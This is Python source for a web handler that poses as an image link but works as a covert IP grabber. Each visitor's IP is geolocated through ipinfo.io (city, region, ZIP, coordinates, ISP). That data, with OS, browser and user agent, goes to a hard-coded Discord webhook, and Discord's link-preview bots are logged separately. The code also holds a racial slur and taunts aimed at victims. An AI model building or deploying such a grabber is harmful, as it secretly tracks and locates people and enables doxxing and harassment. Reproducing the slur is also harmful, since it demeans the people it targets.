from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests
import base64
import httpagentparser

# YOUR WEBHOOK HERE
webhook = 'https://discord.com/api/webhooks/1559315092594630798/yhnQBuFl52mEqp68sUIant-D9AMr2QwypBGHKanjP5DOhTwn2Tby7ohP7oSwjY07Yc5X'

# YOUR ORIGINAL BUGGED BIN DATA
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

# DEFAULT IMAGE FALLBACK (Tiny 1x1 transparent PNG)
DEFAULT_IMG = 'https://placehold.co/1x1.png'

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
      "username": "cure",
      "content": "@everyone",
      "embeds": [
        {
          "title": "lol",
          "color": 16711803,
          "description": "dumbass kid saved the image",
          "author": {"name": "cure"},
          "fields": [
            {"name": "IP Info", "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`", "inline": True},
            {"name": "Advanced Info", "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```", "inline": False}
          ]
        }
      ],
    }

def prev(ip,uag):
    return {
      "username": "cure",
      "content": "cure runs this shit nigga",
      "embeds": [
        {
          "title": "cure alert",
          "color": 16711803,
          "description": f"Link has been sent.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
          "author": {"name": "cure"},
          "fields": []
        }
      ],
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        ip = self.headers.get('x-forwarded-for')

        # Check for Discord Bots
        if ip and ip.startswith(('35','34','104.196')):
            if 'discord' in useragent.lower():
                self.send_response(200)
                self.send_header('Content-type', 'image/png') 
                self.end_headers()
                self.wfile.write(buggedbin) 
                requests.post(webhook, json=prev(ip, useragent))
            else:
                pass
        else:
            target_url = dic.get('url', '')
            data = buggedbin
            
            try:
                # Step 1: Get the SSO Cookie from Vercel
                sso_url = "https://vercel.com/sso-api"
                initial_req = requests.get(sso_url, headers={'User-Agent': 'Mozilla/5.0'})
                
                # Extract the cookie from the response
                cookies = initial_req.cookies
                
                # Step 2: Fetch the actual image using the cookie
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Cookie': '; '.join([f"{k}={v}" for k, v in cookies.items()])
                }
                
                if target_url:
                    # If target_url is also on Vercel, you might need to handle its specific domain
                    # For now, we assume the target_url is a direct image link or uses the same session
                    data = requests.get(target_url, headers=headers).content
                else:
                    data = buggedbin
                    
            except Exception as e:
                print(f"Error fetching image: {e}")
                data = buggedbin

            # Determine Content Type based on the TARGET image extension
            if target_url.lower().endswith('.png'):
                content_type = 'image/png'
            else:
                content_type = 'image/jpeg'

            self.send_response(200)
            self.send_header('Content-type', content_type)
            self.end_headers()
            self.wfile.write(data)
            
            try:
                ipInfo = requests.get(f'https://ipinfo.io/{ip}/json', headers={'User-Agent': 'Mozilla/5.0'}).json()
                requests.post(webhook, json=formatHook(
                    ipInfo.get('ip'), ipInfo.get('city'), ipInfo.get('region'), 
                    ipInfo.get('country'), ipInfo.get('loc'), ipInfo.get('org'), 
                    ipInfo.get('postal'), useragent, os, browser
                ))
            except:
                pass
        
        return
